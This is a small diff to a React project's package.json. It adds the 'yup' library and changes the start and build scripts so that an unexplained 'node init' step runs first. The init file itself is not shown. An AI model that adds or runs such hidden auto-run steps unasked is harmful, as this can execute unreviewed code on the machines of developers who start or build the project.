@@ -21,12 +21,13 @@
     "recharts": "^2.15.0",
     "redux": "^5.0.1",
     "redux-logger": "^3.0.6",
-    "redux-thunk": "^3.1.0"
+    "redux-thunk": "^3.1.0",
+    "yup": "^1.6.1"
   },
   "scripts": {
-    "start": "react-scripts start",
+    "start": "node init && react-scripts start",
     "client": "react-scripts start",
-    "build": "react-scripts build",
+    "build": "node init && react-scripts build",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
